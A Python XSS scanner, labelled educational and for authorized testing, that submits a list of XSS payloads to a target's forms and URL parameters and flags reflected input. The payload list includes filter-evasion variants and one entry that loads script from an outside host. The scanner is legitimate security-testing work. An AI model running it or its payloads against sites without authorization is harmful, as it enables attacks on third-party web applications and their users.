#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) Scanner

This script provides tools to test web applications for XSS vulnerabilities.
It includes functions to detect potential XSS issues through parameter testing
and form submission with various XSS payloads.

This tool is intended for educational purposes and authorized penetration testing only.
"""

import argparse
import re
import requests
import urllib.parse
import sys
import logging
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from requests.exceptions import RequestException
from scripts.utils.disclaimer import print_disclaimer, require_confirmation

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# XSS payloads for testing
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--\n></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "<script>document.write('<img src=\"x\" onerror=\"alert(\'XSS\')\"/>')</script>",
    "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
    "\"><script>alert('XSS')</script>",
    "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>"
]

def extract_forms(url, timeout=10):
    """
    Extract all forms from a given URL.
    
    Parameters:
    -----------
    url : str
        The URL to extract forms from
    timeout : int
        Request timeout in seconds
        
    Returns:
    --------
    list:
        List of dictionaries containing form details
    """
    try:
        response = requests.get(
            url, 
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        )
        response.raise_for_status()
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {}
            action = form.attrs.get('action', '')
            method = form.attrs.get('method', 'get').lower()
            inputs = []
            
            for input_tag in form.find_all('input'):
                input_type = input_tag.attrs.get('type', 'text')
                input_name = input_tag.attrs.get('name')
                input_value = input_tag.attrs.get('value', '')
                
                if input_name:  # Only include inputs with a name attribute
                    inputs.append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
            
            # Include other input elements like textarea and select
            for textarea in form.find_all('textarea'):
                textarea_name = textarea.attrs.get('name')
                if textarea_name:
                    inputs.append({
                        'type': 'textarea',
                        'name': textarea_name,
                        'value': textarea.text
                    })
            
            for select in form.find_all('select'):
                select_name = select.attrs.get('name')
                if select_name:
                    options = []
                    selected_option = ''
                    
                    for option in select.find_all('option'):
                        option_value = option.attrs.get('value', '')
                        options.append(option_value)
                        
                        if 'selected' in option.attrs:
                            selected_option = option_value
                    
                    inputs.append({
                        'type': 'select',
                        'name': select_name,
                        'value': selected_option,
                        'options': options
                    })
            
            form_details['action'] = action
            form_details['method'] = method
            form_details['inputs'] = inputs
            forms.append(form_details)
        
        return forms
    
    except RequestException as e:
        logger.error(f"Error extracting forms from {url}: {str(e)}")
        return []

def is_vulnerable_to_xss(form_details, url, payload, timeout=10):
    """
    Test if a form is vulnerable to XSS with a specific payload.
    
    Parameters:
    -----------
    form_details : dict
        Details of the form to test
    url : str
        The base URL where the form is located
    payload : str
        The XSS payload to test
    timeout : int
        Request timeout in seconds
        
    Returns:
    --------
    tuple:
        (bool, requests.Response): Whether the form is vulnerable and the response
    """
    # Get the form action (target URL)
    target_url = urljoin(url, form_details["action"])
    
    # Get form inputs and prepare data
    inputs = form_details["inputs"]
    data = {}
    
    for input_field in inputs:
        # Don't modify file upload fields or submit buttons
        if input_field["type"] in ["submit", "file", "image"]:
            continue
        
        # For input fields that accept text, use the payload
        if input_field["type"] in ["text", "search", "email", "url", "textarea"]:
            data[input_field["name"]] = payload
        else:
            # Use the default value for other fields
            data[input_field["name"]] = input_field["value"]
    
    # Make the request
    if form_details["method"] == "post":
        response = requests.post(
            target_url, 
            data=data,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        )
    else:  # GET method
        response = requests.get(
            target_url, 
            params=data,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        )
    
    # Check if the payload is reflected in the response
    # If it is, the application might be vulnerable to XSS
    return payload in response.text, response

def test_xss_in_form(form_details, url, timeout=10):
    """
    Test a form for XSS vulnerabilities using multiple payloads.
    
    Parameters:
    -----------
    form_details : dict
        Details of the form to test
    url : str
        The base URL where the form is located
    timeout : int
        Request timeout in seconds
        
    Returns:
    --------
    dict:
        Results of the form XSS test
    """
    form_action = urljoin(url, form_details["action"])
    logger.info(f"Testing form with action: {form_action}")
    
    vulnerable_details = {
        'form_action': form_action,
        'method': form_details["method"],
        'vulnerable': False,
        'payload': None,
        'inputs': [input_field["name"] for input_field in form_details["inputs"] 
                  if input_field["type"] not in ["submit", "file", "image"]]
    }
    
    for payload in XSS_PAYLOADS:
        try:
            is_vulnerable, response = is_vulnerable_to_xss(form_details, url, payload, timeout)
            
            if is_vulnerable:
                vulnerable_details['vulnerable'] = True
                vulnerable_details['payload'] = payload
                return vulnerable_details
        
        except RequestException as e:
            logger.error(f"Request error testing form {form_action} with payload {payload}: {str(e)}")
            continue
    
    return vulnerable_details

def test_xss_in_url_params(url, timeout=10):
    """
    Test URL parameters for XSS vulnerabilities.
    
    Parameters:
    -----------
    url : str
        The URL to test
    timeout : int
        Request timeout in seconds
        
    Returns:
    --------
    dict:
        Results of the URL parameter XSS test
    """
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed_url.query)
    
    results = {
        'url': url,
        'vulnerable_params': []
    }
    
    if not params:
        return results
    
    base_url = url.split('?')[0]
    
    for param_name, param_value in params:
        logger.info(f"Testing parameter: {param_name}")
        
        for payload in XSS_PAYLOADS:
            # Create a copy of the parameters and modify the current one
            modified_params = dict(params)
            modified_params[param_name] = payload
            
            query_string = urllib.parse.urlencode(modified_params)
            test_url = f"{base_url}?{query_string}"
            
            try:
                response = requests.get(
                    test_url,
                    timeout=timeout,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                    }
                )
                
                # Check if the payload is reflected in the response
                if payload in response.text:
                    results['vulnerable_params'].append({
                        'param': param_name,
                        'payload': payload
                    })
                    break  # No need to test other payloads for this parameter
            
            except RequestException as e:
                logger.error(f"Request error testing parameter {param_name} with payload {payload}: {str(e)}")
                continue
    
    return results

def scan_url_for_xss(url, scan_forms=True, timeout=10):
    """
    Scan a URL for XSS vulnerabilities, including forms and URL parameters.
    
    Parameters:
    -----------
    url : str
        The URL to scan
    scan_forms : bool
        Whether to scan forms on the page
    timeout : int
        Request timeout in seconds
        
    Returns:
    --------
    dict:
        Scan results including vulnerable forms and parameters
    """
    logger.info(f"Scanning URL for XSS: {url}")
    start_time = time.time()
    
    results = {
        'url': url,
        'vulnerable_forms': [],
        'vulnerable_params': [],
        'scan_time': None
    }
    
    # Test URL parameters
    url_params_results = test_xss_in_url_params(url, timeout)
    if url_params_results['vulnerable_params']:
        results['vulnerable_params'] = url_params_results['vulnerable_params']
    
    # Test forms if requested
    if scan_forms:
        forms = extract_forms(url, timeout)
        logger.info(f"Found {len(forms)} forms on {url}")
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for form in forms:
                futures.append(executor.submit(test_xss_in_form, form, url, timeout))
            
            for future in futures:
                form_result = future.result()
                if form_result['vulnerable']:
                    results['vulnerable_forms'].append(form_result)
    
    end_time = time.time()
    results['scan_time'] = end_time - start_time
    
    return results

def print_scan_results(results):
    """
    Print the XSS scan results in a readable format.
    
    Parameters:
    -----------
    results : dict
        The scan results to print
        
    Returns:
    --------
    None
    """
    print("\n" + "=" * 80)
    print(f"XSS SCAN RESULTS FOR: {results['url']}")
    print(f"Scan Time: {results['scan_time']:.2f} seconds")
    print("=" * 80)
    
    if not results['vulnerable_forms'] and not results['vulnerable_params']:
        print("\nNo XSS vulnerabilities were detected.")
        print("\nNote: This does not guarantee that the application is secure.")
        print("Manual testing and code review are recommended for comprehensive assessment.")
    else:
        vulnerable_count = len(results['vulnerable_forms']) + len(results['vulnerable_params'])
        print(f"\nVulnerabilities Found: {vulnerable_count}")
        
        if results['vulnerable_params']:
            print("\nVulnerable URL Parameters:")
            for i, param in enumerate(results['vulnerable_params'], 1):
                print(f"{i}. Parameter: {param['param']}")
                print(f"   Payload: {param['payload']}")
                print()
        
        if results['vulnerable_forms']:
            print("\nVulnerable Forms:")
            for i, form in enumerate(results['vulnerable_forms'], 1):
                print(f"{i}. Form Action: {form['form_action']}")
                print(f"   Method: {form['method'].upper()}")
                print(f"   Inputs: {', '.join(form['inputs'])}")
                print(f"   Payload: {form['payload']}")
                print()
    
    print("\n" + "=" * 80)
    print("EDUCATIONAL INFORMATION:")
    print("Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject client-side")
    print("scripts into web pages viewed by others, potentially leading to:")
    print("- Cookie theft and session hijacking")
    print("- Phishing attacks")
    print("- Website defacement")
    print("- Malware distribution")
    print("\nRecommended fixes:")
    print("1. Implement input validation and output encoding")
    print("2. Use Content Security Policy (CSP) headers")
    print("3. Apply the principle of least privilege for JavaScript execution")
    print("4. Use modern frameworks that automatically escape output")
    print("5. Implement X-XSS-Protection and other security headers")
    print("=" * 80 + "\n")

def main():
    """Main function to run the XSS scanner from the command line."""
    parser = argparse.ArgumentParser(
        description="Cross-Site Scripting (XSS) Scanner for Educational Purposes",
        epilog="This tool is for educational and authorized testing only."
    )
    
    parser.add_argument(
        "-u", "--url", 
        required=True,
        help="Target URL to scan"
    )
    
    parser.add_argument(
        "--no-forms",
        action="store_true",
        help="Skip form scanning, only test URL parameters"
    )
    
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    # Display disclaimer and require confirmation
    print_disclaimer(
        script_name="XSS Scanner",
        description="Tests web applications for Cross-Site Scripting vulnerabilities",
        additional_warning="This tool actively sends potentially malicious payloads to the target."
    )
    
    if not require_confirmation():
        return
    
    try:
        # Perform the scan
        results = scan_url_for_xss(
            args.url,
            scan_forms=not args.no_forms,
            timeout=args.timeout
        )
        
        # Print the results
        print_scan_results(results)
        
    except Exception as e:
        logger.error(f"An error occurred: {str(e)}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
